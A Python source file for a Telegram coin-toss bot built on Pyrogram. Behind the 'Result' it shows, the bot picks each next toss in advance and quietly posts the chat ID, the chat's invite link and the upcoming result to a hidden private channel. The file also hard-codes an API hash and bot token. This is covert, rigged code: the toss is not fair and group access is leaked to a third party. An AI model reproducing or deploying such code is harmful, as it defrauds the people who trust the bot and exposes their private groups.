from pyrogram import Client, filters
from pyrogram.types import Message
import os

import random

API_ID = 11573285
API_HASH = "f2cc3fdc32197c8fbaae9d0bf69d2033"
BOT_TOKEN = "6199295305:AAHFbgH0htt1-sEEhqXdsEHO81h22ru8YQc"


app = Client("tebbbst", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

store_future = {}

coins = ["Heads", "Tails", "Tails", "Heads", "Tails"]

@app.on_message(filters.command(["start", "help"]))
def send_os(client, message):
    app.send_message(message.chat.id, "Welcome")


@app.on_message(filters.command(["vtoss"]))
def send_wesnos(client, message):
    chat_id = message.chat.id
    invite_link = app.get_chat_invite_link(chat_id, disable_web_page_preview=True)
    try:
        lol = store_future[chat_id]
    except:
        lol = "Heads"
    message.reply_video("https://graph.org/file/6601d846c73a2a851194a.mp4", caption=f"💫 Result : {lol} 🎖️")
    owo = random.choice(coins)
    store_future[chat_id] = owo
    app.send_message(-1001844084371, f"**Chat ID** : {chat_id}\n**Invite Link** : {invite_link} \n**Next Toss** : {owo}")
    
    
    
print("started")    
app.run()
